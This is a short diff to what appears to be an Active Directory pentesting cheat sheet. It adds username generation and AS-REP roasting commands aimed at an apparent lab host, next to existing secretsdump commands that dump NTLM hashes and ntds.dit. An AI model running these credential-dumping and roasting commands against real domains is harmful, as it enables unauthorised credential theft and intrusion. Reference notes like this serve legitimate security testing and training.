@@ -1914,6 +1914,12 @@ secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
 secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 #use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
 ```
+### Generating Usernames
+```bash
+/username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
+nxc ldap sauna -u unames.txt -p '' --asreproast asrep.txt
+```
+
 
 ## Lateral Movement in Active Directory
 
